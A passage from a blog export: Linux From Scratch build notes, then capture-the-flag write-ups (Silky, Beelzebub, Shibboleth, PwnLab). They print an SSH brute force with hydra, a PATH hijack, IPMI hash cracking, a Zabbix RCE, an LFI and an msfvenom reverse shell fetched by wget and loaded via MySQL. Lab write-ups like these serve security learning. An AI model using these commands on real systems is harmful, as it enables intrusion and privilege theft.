$LFS/lib64/ld-lsb-x86-64.so.3 ;; esac Patch glibc: tar -xvf glibc-2.35.tar.xz cd glibc-2.35 patch -Np1 -i ../glibc-2.35-fhs-1.patch Then build it: mkdir -v build cd build echo \"rootsbindir=/usr/sbin\" > configparms ../configure \\ --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(../scripts/config.guess) \\ --enable-kernel=3.2 \\ --with-headers=$LFS/usr/include \\ libc_cv_slibdir=/usr/lib make Nice, my OS is already half broken xD.The first command is the one who can broke the system because if $LFS is empty it will be installed in your system. Because this library provides the basic routines for allocating memory, searching directories, opening and closing files, reading and writing files, string handling, pattern matching, arithmetic, and so on. make DESTDIR=$LFS install sed '/RTLDLIST=/s@/usr@@g' -i $LFS/usr/bin/ldd Sanity check: echo 'int main()&#123;&#125;' > dummy.c $LFS_TGT-gcc dummy.c readelf -l a.out | grep '/ld-linux' If there is no error you can continue. rm -v dummy.c a.out $LFS/tools/libexec/gcc/$LFS_TGT/11.2.0/install-tools/mkheaders Libstdc++ from GCC-11.2.0https://linuxfromscratch.org/lfs/view/stable/chapter05/gcc-libstdc++-pass1.htmlLibstdc++ is part of the GCC sources. You should first unpack the GCC tarball and change to the gcc-11.2.0 directory.So let’s go to the gcc directory cd ../../gcc-11.2.0 mv build/ build.back mkdir -v build cd build ../libstdc++-v3/configure \\ --host=$LFS_TGT \\ --build=$(../config.guess) \\ --prefix=/usr \\ --disable-multilib \\ --disable-nls \\ --disable-libstdcxx-pch \\ --with-gxx-include-dir=/tools/$LFS_TGT/include/c++/11.2.0 make make DESTDIR=$LFS install Cross Compiling Temporary Toolshttps://linuxfromscratch.org/lfs/view/stable/chapter06/chapter06.html M4-1.4.19cd ../../ tar -xf m4-1.4.19.tar.xz cd m4-1.4.19 ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make Oh it’s broken.Because I forgot this in the gcc directory: cat gcc/limitx.h gcc/glimits.h gcc/limity.h > \\ `dirname $($LFS_TGT-gcc -print-libgcc-file-name)`/install-tools/include/limits.h Now we can install make DESTDIR=$LFS install Ncurses-6.3https://linuxfromscratch.org/lfs/view/stable/chapter06/ncurses.html tar -xvf ncurses-6.3 cd ncurses-6.3 Build tic: mkdir build pushd build ../configure make -C include make -C progs tic popd Prepare Ncurses for compilation: ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(./config.guess) \\ --mandir=/usr/share/man \\ --with-manpage-format=normal \\ --with-shared \\ --without-debug \\ --without-ada \\ --without-normal \\ --disable-stripping \\ --enable-widec Make and install: make -j4 make DESTDIR=$LFS TIC_PATH=$(pwd)/build/progs/tic install echo \"INPUT(-lncursesw)\" > $LFS/usr/lib/libncurses.so Bash-5.1.16https://linuxfromscratch.org/lfs/view/stable/chapter06/bash.html tar -xvf bash-5.1.16.tar.gz cd bash-5.1.16 ./configure --prefix=/usr \\ --build=$(support/config.guess) \\ --host=$LFS_TGT \\ --without-bash-malloc make -j4 make DESTDIR=$LFS install Make a link for the programs that use sh for a shell: ln -sv bash $LFS/bin/sh Coreutils-9.0https://linuxfromscratch.org/lfs/view/stable/chapter06/coreutils.html tar -xvf coreutils-9.0.tar.xz cd coreutils-9.0 ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) \\ --enable-install-program=hostname \\ --enable-no-install-program=kill,uptime make -j4 make DESTDIR=$LFS install Then move the program to the final destination. mv -v $LFS/usr/bin/chroot $LFS/usr/sbin mkdir -pv $LFS/usr/share/man/man8 mv -v $LFS/usr/share/man/man1/chroot.1 $LFS/usr/share/man/man8/chroot.8 sed -i 's/\"1\"/\"8\"/' $LFS/usr/share/man/man8/chroot.8 Diffutils-3.8https://linuxfromscratch.org/lfs/view/stable/chapter06/diffutils.html tar -xvf diffutils-3.8.tar.xz cd diffutils-3.8 ./configure --prefix=/usr --host=$LFS_TGT make -j4 make DESTDIR=$LFS install File-5.41https://linuxfromscratch.org/lfs/view/stable/chapter06/file.html cd file-5.41 mkdir build pushd build ../configure --disable-bzlib \\ --disable-libseccomp \\ --disable-xzlib \\ --disable-zlib make popd ./configure --prefix=/usr --host=$LFS_TGT --build=$(./config.guess) make FILE_COMPILE=$(pwd)/build/src/file make DESTDIR=$LFS install Findutils-4.9.0https://linuxfromscratch.org/lfs/view/stable/chapter06/findutils.htmlThat’s a lot of packages… tar -xvf findutils-4.9.0.tar.xz cd findutils-4.9.0 ./configure --prefix=/usr \\ --localstatedir=/var/lib/locate \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make -j4 make DESTDIR=$LFS install Gawk-5.1.1https://linuxfromscratch.org/lfs/view/stable/chapter06/gawk.html tar -xvf gawk-5.1.1.tar.xz cd gawk-5.1.1 sed -i 's/extras//' Makefile.in ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make -j4 make DESTDIR=$LFS install Grep-3.7https://linuxfromscratch.org/lfs/view/stable/chapter06/grep.html tar -xvf grep-3.7.tar.xz cd grep-3.7 ./configure --prefix=/usr \\ --host=$LFS_TGT make -j4 make DESTDIR=$LFS install Gzip-1.11https://linuxfromscratch.org/lfs/view/stable/chapter06/gzip.html tar -xvf gzip-1.11.tar.xz cd gzip-1.11.tar ./configure --prefix=/usr --host=$LFS_TGT make -j4 make DESTDIR=$LFS install Make-4.3https://linuxfromscratch.org/lfs/view/stable/chapter06/make.html cd make-4.3 ./configure --prefix=/usr \\ --without-guile \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make -j4 make DESTDIR=$LFS install Patch-2.7.6https://linuxfromscratch.org/lfs/view/stable/chapter06/patch.html tar -xvf patch-2.7.6.tar.xz cd patch-2.7.6 ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make -j4 make DESTDIR=$LFS install Sed-4.8https://linuxfromscratch.org/lfs/view/stable/chapter06/sed.html tar -xvf sed-4.8.tar.xz cd sed-4.8 ./configure --prefix=/usr \\ --host=$LFS_TGT make -j4 make DESTDIR=$LFS install Tar-1.34https://linuxfromscratch.org/lfs/view/stable/chapter06/tar.html tar -xvf tar-1.34.tar.xz cd tar-1.34 ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) make -j4 make DESTDIR=$LFS install Xz-5.2.5https://linuxfromscratch.org/lfs/view/stable/chapter06/xz.html tar -xvf xz-5.2.5.tar.xz cd xz-5.2.5 ./configure --prefix=/usr \\ --host=$LFS_TGT \\ --build=$(build-aux/config.guess) \\ --disable-static \\ --docdir=/usr/share/doc/xz-5.2.5 make -j4 make DESTDIR=$LFS install Binutils-2.38 - Pass 2https://linuxfromscratch.org/lfs/view/stable/chapter06/binutils-pass2.html cd binutils-2.38 sed '6009s/$add_dir//' -i ltmain.sh rm -rf build mkdir -v build cd build ../configure \\ --prefix=/usr \\ --build=$(../config.guess) \\ --host=$LFS_TGT \\ --disable-nls \\ --enable-shared \\ --disable-werror \\ --enable-64-bit-bfd make -j4 make DESTDIR=$LFS install GCC-11.2.0 - Pass 2https://linuxfromscratch.org/lfs/view/stable/chapter06/gcc-pass2.html rm gcc-11.2.0 -rf tar -xvf gcc-11.2.0.tar.xz cd gcc-11.2.0 tar -xf ../mpfr-4.1.0.tar.xz mv -v mpfr-4.1.0 mpfr tar -xf ../gmp-6.2.1.tar.xz mv -v gmp-6.2.1 gmp tar -xf ../mpc-1.2.1.tar.gz mv -v mpc-1.2.1 mpc case $(uname -m) in x86_64) sed -e '/m64=/s/lib64/lib/' -i.orig gcc/config/i386/t-linux64 ;; esac mkdir -v build cd build mkdir -pv $LFS_TGT/libgcc ln -s ../../../libgcc/gthr-posix.h $LFS_TGT/libgcc/gthr-default.h ../configure \\ --build=$(../config.guess) \\ --host=$LFS_TGT \\ --prefix=/usr \\ CC_FOR_TARGET=$LFS_TGT-gcc \\ --with-build-sysroot=$LFS \\ --enable-initfini-array \\ --disable-nls \\ --disable-multilib \\ --disable-decimal-float \\ --disable-libatomic \\ --disable-libgomp \\ --disable-libquadmath \\ --disable-libssp \\ --disable-libvtv \\ --disable-libstdcxx \\ --enable-languages=c,c++ make -j4 make DESTDIR=$LFS install ln -sv gcc $LFS/usr/bin/cc Changing OwnershipThe directory /mnt/lfs is owned by the user lfs on my host.I need to change that to the user root of my system.I open a new terminal as root then copy past the content of the .bashrc of lfs in the terminal. set +h umask 022 LFS=/mnt/lfs LC_ALL=POSIX LFS_TGT=$(uname -m)-lfs-linux-gnu PATH=/usr/bin if [ ! -L /bin ]; then PATH=/bin:$PATH; fi PATH=$LFS/tools/bin:$PATH CONFIG_SITE=$LFS/usr/share/config.site export LFS LC_ALL LFS_TGT PATH CONFIG_SITE I know I could just export the $LFS and $LFS_TGT. chown -R root:root $LFS/&#123;usr,lib,var,etc,bin,sbin,tools&#125; case $(uname -m) in x86_64) chown -R root:root $LFS/lib64 ;; esac Preparing Virtual Kernel File Systemshttps://linuxfromscratch.org/lfs/view/stable/chapter07/kernfs.html mkdir -pv $LFS/&#123;dev,proc,sys,run&#125; mknod -m 600 $LFS/dev/console c 5 1 mknod -m 666 $LFS/dev/null c 1 3 mount -v --bind /dev $LFS/dev mount -v --bind /dev/pts $LFS/dev/pts mount -vt proc proc $LFS/proc mount -vt sysfs sysfs $LFS/sys mount -vt tmpfs tmpfs $LFS/run if [ -h $LFS/dev/shm ]; then mkdir -pv $LFS/$(readlink $LFS/dev/shm) fi Entering the Chroot Environmentchroot \"$LFS\" /usr/bin/env -i \\ HOME=/root \\ TERM=\"$TERM\" \\ PS1='(lfs chroot) \\u:\\w\\$ ' \\ PATH=/usr/bin:/usr/sbin \\ /bin/bash --login I have no name: This is normal because the /etc/passwd file has not been created yet. Creating Directoriesmkdir -pv /&#123;boot,home,mnt,opt,srv&#125; mkdir -pv /etc/&#123;opt,sysconfig&#125; mkdir -pv /lib/firmware mkdir -pv /media/&#123;floppy,cdrom&#125; mkdir -pv /usr/&#123;,local/&#125;&#123;include,src&#125; mkdir -pv /usr/local/&#123;bin,lib,sbin&#125; mkdir -pv /usr/&#123;,local/&#125;share/&#123;color,dict,doc,info,locale,man&#125; mkdir -pv /usr/&#123;,local/&#125;share/&#123;misc,terminfo,zoneinfo&#125; mkdir -pv /usr/&#123;,local/&#125;share/man/man&#123;1..8&#125; mkdir -pv /var/&#123;cache,local,log,mail,opt,spool&#125; mkdir -pv /var/lib/&#123;color,misc,locate&#125; ln -sfv /run /var/run ln -sfv /run/lock /var/lock install -dv -m 0750 /root install -dv -m 1777 /tmp /var/tmp You can also create more directories:https://refspecs.linuxfoundation.org/fhs.shtml Creating Essential Files and Symlinkshttps://linuxfromscratch.org/lfs/view/stable/chapter07/createfiles.htmlDon’t copy past this, it’s bugy, copy it from the LFS above. ln -sv /proc/self/mounts /etc/mtab cat > /etc/hosts &lt;&lt; EOF 127.0.0.1 localhost $(hostname) ::1 localhost EOF cat > /etc/passwd &lt;&lt; \"EOF\" `root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/dev/null:/usr/bin/false daemon:x:6:6:Daemon User:/dev/null:/usr/bin/false messagebus:x:18:18:D-Bus Message Daemon User:/run/dbus:/usr/bin/false uuidd:x:80:80:UUID Generation Daemon User:/dev/null:/usr/bin/false nobody:x:99:99:Unprivileged User:/dev/null:/usr/bin/false` EOF cat > /etc/group &lt;&lt; \"EOF\" `root:x:0: bin:x:1:daemon sys:x:2: kmem:x:3: tape:x:4: tty:x:5: daemon:x:6: floppy:x:7: disk:x:8: lp:x:9: dialout:x:10: audio:x:11: video:x:12: utmp:x:13: usb:x:14: cdrom:x:15: adm:x:16: messagebus:x:18: input:x:24: mail:x:34: kvm:x:61: uuidd:x:80: wheel:x:97: nogroup:x:99: users:x:999:` EOF echo \"tester:x:101:101::/home/tester:/bin/bash\" >> /etc/passwd echo \"tester:x:101:\" >> /etc/group install -o tester -d /home/tester exec /usr/bin/bash --login touch /var/log/&#123;btmp,lastlog,faillog,wtmp&#125; chgrp -v utmp /var/log/lastlog chmod -v 664 /var/log/lastlog chmod -v 600 /var/log/btmp Libstdc++ from GCC-11.2.0, Pass 2https://linuxfromscratch.org/lfs/view/stable/chapter07/gcc-libstdc++-pass2.html cd /sources/gcc-11.2.0 ln -s gthr-posix.h libgcc/gthr-default.h mkdir -v build cd build ../libstdc++-v3/configure \\ CXXFLAGS=\"-g -O2 -D_GNU_SOURCE\" \\ --prefix=/usr \\ --disable-multilib \\ --disable-nls \\ --host=$(uname -m)-lfs-linux-gnu \\ --disable-libstdcxx-pch make -j4 make install Gettext-0.21https://linuxfromscratch.org/lfs/view/stable/chapter07/gettext.html tar -xf gettext-0.21.tar.xz cd gettext-0.21 ./configure --disable-shared make -j4 cp -v gettext-tools/src/&#123;msgfmt,msgmerge,xgettext&#125; /usr/bin Bison-3.8.2https://linuxfromscratch.org/lfs/view/stable/chapter07/bison.html tar -xf bison-3.8.2.tar.xz cd bison-3.8.2 ./configure --prefix=/usr \\ --docdir=/usr/share/doc/bison-3.8.2 make -j4 make install Perl-5.34.0https://linuxfromscratch.org/lfs/view/stable/chapter07/perl.html cd ../ tar -xf perl-5.34.0.tar.xz cd perl-5.34.0 sh Configure -des \\ -Dprefix=/usr \\ -Dvendorprefix=/usr \\ -Dprivlib=/usr/lib/perl5/5.34/core_perl \\ -Darchlib=/usr/lib/perl5/5.34/core_perl \\ -Dsitelib=/usr/lib/perl5/5.34/site_perl \\ -Dsitearch=/usr/lib/perl5/5.34/site_perl \\ -Dvendorlib=/usr/lib/perl5/5.34/vendor_perl \\ -Dvendorarch=/usr/lib/perl5/5.34/vendor_perl make -j4 make install Python-3.10.2https://linuxfromscratch.org/lfs/view/stable/chapter07/Python.html tar -xf Python-3.10.2.tar.xz cd Python-3.10.2 ./configure --prefix=/usr \\ --enable-shared \\ --without-ensurepip make -j4 make install Texinfo-6.8https://linuxfromscratch.org/lfs/view/stable/chapter07/texinfo.html sed -e 's/__attribute_nonnull__/__nonnull/' \\ -i gnulib/lib/malloc/dynarray-skeleton.c ./configure --prefix=/usr make -j4 make install Util-linux-2.37.4https://linuxfromscratch.org/lfs/view/stable/chapter07/util-linux.html mkdir -pv /var/lib/hwclock ./configure ADJTIME_PATH=/var/lib/hwclock/adjtime \\ --libdir=/usr/lib \\ --docdir=/usr/share/doc/util-linux-2.37.4 \\ --disable-chfn-chsh \\ --disable-login \\ --disable-nologin \\ --disable-su \\ --disable-setpriv \\ --disable-runuser \\ --disable-pylibmount \\ --disable-static \\ --without-python \\ runstatedir=/run make -j4 make install Cleaningrm -rf /usr/share/&#123;info,man,doc&#125;/* find /usr/&#123;lib,libexec&#125; -name \\*.la -delete rm -rf /tools Backupexit umount $LFS/dev/pts umount $LFS/&#123;sys,proc,run,dev&#125; cd $LFS tar -cJpf $HOME/lfs-temp-tools-11.1.tar.xz /iso Restorecd $LFS rm -rf ./* tar -xpf $HOME/lfs-temp-tools-11.1.tar.xz https://linuxfromscratch.org/lfs/view/stable/part4.html Installation of Man-pagesmake prefix=/usr install Installation of Iana-Etccp services protocols /etc Installation of Glibcpatch -Np1 -i ../glibc-2.35-fhs-1.patch mkdir -v build cd build echo \"rootsbindir=/usr/sbin\" > configparms ../configure --prefix=/usr \\ --disable-werror \\ --enable-kernel=3.2 \\ --enable-stack-protector=strong \\ --with-headers=/usr/include \\ libc_cv_slibdir=/usr/lib make -j4 make check","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Silky 0x01","slug":"CTF_Silky_0x01","date":"2022-06-12T16:44:52.000Z","updated":"2022-09-27T07:49:09.891Z","comments":true,"path":"/post/CTF_Silky_0x01.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Silky_0x01.html","excerpt":"","text":"netdiscover192.168.0.12 rustscanrustscan -a 192.168.0.12 gobustergobuster dir -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt gobuster dir -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt http://192.168.0.12/notes.txt Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem. I really need to remove the password from the page, after all the last 2 characters are missing. But still. view-source:http://192.168.0.12/script.js// s1lKy WordlistSo the password should be at 7 charachters.Let’s create a wordlist with crunch. crunch 7 7 -t s1lKy^% > pass Hydrahydra -l silky -P pass 192.168.0.12 -t 10 -V ssh sshssh ssilky@192.168.0.12 s1lKy#5 lse /usr/bin/sky/usr/bin/sky Output: Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. gezeichnet: root strings /usr/bin/sky Output:He use whoami as root, let’s create our own whoami file. cd /tmp echo \"/bin/sh\" > whoami chmod +x whoami export PATH=\"/tmp:$PATH\" /usr/bin/sky The flag:","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Beelzebub","slug":"CTF_Beelzebub","date":"2022-06-09T17:29:02.000Z","updated":"2022-09-27T07:49:10.094Z","comments":true,"path":"/post/CTF_Beelzebub.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Beelzebub.html","excerpt":"","text":"netdiscoversudo netdiscover rustscanrustscan -a 192.168.0.24 On the port 80 we have this page: gobustergobuster dir -t 100 -u http://192.168.0.24 -w ~/Documents/wordlist/directory-list-medium.txt --wildcard switch The javascript directory is forbiden: There is a phpmyadmin page, let’s see if there is a index.php. MD5 hash echo -n beelzebub | md5sum This string is a directory. Beelzebub websiteThere is something but I can’t see it, the ip is hard coded in the website.This in a wordpress website, I should see what is in the upload directory:http://192.168.0.24/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/If you browse to Talk To VALAK you can see this page:You can also found a password: Cookie&#x3D;b7d0eff31b9cde9a862dc157bb33ec2a; Password&#x3D;M4k3Ad3a1 I should do a scan on the word press website but it’s taking too much time to load, I will find the user on the login page of the VM.User: KrampusPassword: M4k3Ad3a1 sshssh krampus@192.168.0.24 Yes I’m in. cat .bash_history I’m will copy past this:I’m root.Flag: 8955qpasq8qq807879p75e1rr24cr1a5","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Shibboleth","slug":"CTF_Shibboleth","date":"2022-03-12T23:29:02.000Z","updated":"2022-09-27T07:49:09.501Z","comments":true,"path":"/post/CTF_Shibboleth.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Shibboleth.html","excerpt":"","text":"/etc/hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb PORT STATE SERVICE VERSION 80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;shibboleth.htb&#x2F; -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;assets (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;shibboleth.htb&#x2F;assets&#x2F;] &#x2F;forms (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;shibboleth.htb&#x2F;forms&#x2F;] &#x2F;server-status (Status: 403) [Size: 279] http://shibboleth.htb/forms/In the Readme.txt we have this: Fully working PHP&#x2F;AJAX contact form script is available in the pro version of the template. You can buy it from: https:&#x2F;&#x2F;bootstrapmade.com&#x2F;flexstart-bootstrap-startup-template&#x2F; In the contact.php we have this: Unable to load the &quot;PHP Email Form&quot; Library! Subdomain listingwfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains-top1million-5000.txt -u http:&#x2F;&#x2F;shibboleth.htb&#x2F; -H &quot;Host: FUZZ.shibboleth.htb&quot; --hw 26 The –hw mean I will exclude every resultats with word 26. We also have an hint in main page. gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;zabbix.shibboleth.htb -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt -k &#x2F;modules (Status: 301) [Size: 332] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;modules&#x2F;] &#x2F;assets (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;assets&#x2F;] &#x2F;audio (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;audio&#x2F;] &#x2F;local (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;local&#x2F;] &#x2F;app (Status: 301) [Size: 328] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;app&#x2F;] &#x2F;js (Status: 301) [Size: 327] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;js&#x2F;] &#x2F;include (Status: 301) [Size: 332] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;include&#x2F;] &#x2F;conf (Status: 301) [Size: 329] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;conf&#x2F;] &#x2F;vendor (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;vendor&#x2F;] &#x2F;fonts (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;fonts&#x2F;] &#x2F;locale (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;locale&#x2F;] &#x2F;server-status (Status: 403) [Size: 286] It’s forbiden everywhere.I found nothing and all the new exploits of zabbix don’t work.I have to continue the enumeration. nmap UDPsudo nmap -sU nmap -sU --min-rate 5000 shibboleth.htb PORT STATE SERVICE 518&#x2F;udp closed ntalk 623&#x2F;udp open asf-rmcp 16919&#x2F;udp closed unknown 16972&#x2F;udp closed unknown 30975&#x2F;udp closed unknown 42431&#x2F;udp closed unknown 44253&#x2F;udp closed unknown The port 623 is open. Exploit IPMI (port 623)msfconsole use auxiliary&#x2F;scanner&#x2F;ipmi&#x2F;ipmi_dumphashes set RHOSTS 10.10.11.124 run ... [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:5479a2ba820600003ad3a123b77e26a23ce881756019b75dec504d50007565022cf0fcdb1f86674ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2d636e7b85ec1c5ab81526480df9ff2e614f4379 Crack the hashI store the hash in the hash file.I’m gonna use hashcat to crack it. hashcat -h |grep IPMI Output 7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol So the command gonna be this one. hashcat -m 7300 -a 0 hash &#x2F;home&#x2F;peanutstick&#x2F;Documents&#x2F;wordlist&#x2F;rockyou.txt I have a password. ZabbixAs we can see it’s Zabbix 5.0.17.I’m gonna use this exploit.https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html python3 exploit.py http:&#x2F;&#x2F;zabbix.shibboleth.htb Administrator Thepassword 10.10.14.147 4648 I’m in. Privilege escalationls &#x2F;home Output ipmi-svc So we have to connect with this user and the password we found in the hash. su ipmi-svc Enum with shellI have to upgrade the shell first. python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; Now let’s se if there is come creds in clear text. grep --color&#x3D;auto -rnw &#39;&#x2F;etc&#39; -ie &quot;Password&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null Exploit mysqlCreate the payloadYou have to use an another port. msfvenom -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.14.147 LPORT&#x3D;4649 -f elf-so -o exp.so python2.7 -m SimpleHTTPServer Listen with netcat. nc -nlvp 4649 Upload the payloadOn the server mkdir &#x2F;tmp&#x2F;exp cd &#x2F;tmp&#x2F;exp wget http:&#x2F;&#x2F;10.10.14.147:8000&#x2F;exp.so Execute the payloadmysql -u zabbix -p with mysql. SET GLOBAL wsrep_provider&#x3D;&quot;&#x2F;tmp&#x2F;exp&#x2F;exp.so&quot;; I’m root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF PwnLab","slug":"CTF_PwnLab","date":"2022-03-06T03:07:56.000Z","updated":"2022-09-27T07:49:10.058Z","comments":true,"path":"/post/CTF_PwnLab.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_PwnLab.html","excerpt":"","text":"netdiscoversudo netdiscover 192.168.0.29 nmapnmap -sV 192.168.0.29 -p- 80, 11, 3306, 33795 port 80gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.29&#x2F; -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;upload (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;upload&#x2F;] &#x2F;images (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;images&#x2F;] port 111sudo nmap -sSUC -p111 192.168.0.29 PORT STATE SERVICE 111&#x2F;tcp open rpcbind | rpcinfo: | program version port&#x2F;proto service | 100000 2,3,4 111&#x2F;tcp rpcbind | 100000 2,3,4 111&#x2F;udp rpcbind | 100000 3,4 111&#x2F;tcp6 rpcbind | 100000 3,4 111&#x2F;udp6 rpcbind | 100024 1 33795&#x2F;tcp status | 100024 1 44347&#x2F;udp6 status | 100024 1 50459&#x2F;tcp6 status |_ 100024 1 60795&#x2F;udp status 111&#x2F;udp open rpcbind | rpcinfo: | program version port&#x2F;proto service | 100000 2,3,4 111&#x2F;tcp rpcbind | 100000 2,3,4 111&#x2F;udp rpcbind | 100000 3,4 111&#x2F;tcp6 rpcbind | 100000 3,4 111&#x2F;udp6 rpcbind | 100024 1 33795&#x2F;tcp status | 100024 1 44347&#x2F;udp6 status | 100024 1 50459&#x2F;tcp6 status |_ 100024 1 60795&#x2F;udp status Nothing interesting MysqlI don’t have the creds so I can try to exploit now. Port 80 LFIhttps://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/It’s not working for /etc/passwd but there is a file login and upload, I can try them. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;login Output: &lt;html> &lt;head> &lt;title>PwnLab Intranet Image Hosting&lt;/title> &lt;/head> &lt;body> &lt;center> &lt;img src=\"images/pwnlab.png\">&lt;br /> [ &lt;a href=\"/\">Home&lt;/a> ] [ &lt;a href=\"?page=login\">Login&lt;/a> ] [ &lt;a href=\"?page=upload\">Upload&lt;/a> ] &lt;hr/>&lt;br/> PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==&lt;/center> &lt;/body> &lt;/html>% I have to decode it, it’s in base 64. &lt;?php session_start(); require(\"config.php\"); $mysqli = new mysqli($server, $username, $password, $database); if (isset($_POST['user']) and isset($_POST['pass'])) &#123; $luser = $_POST['user']; $lpass = base64_encode($_POST['pass']); ... We also have the file config.php. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;config Output: &lt;?php $server &#x3D; &quot;localhost&quot;; $username &#x3D; 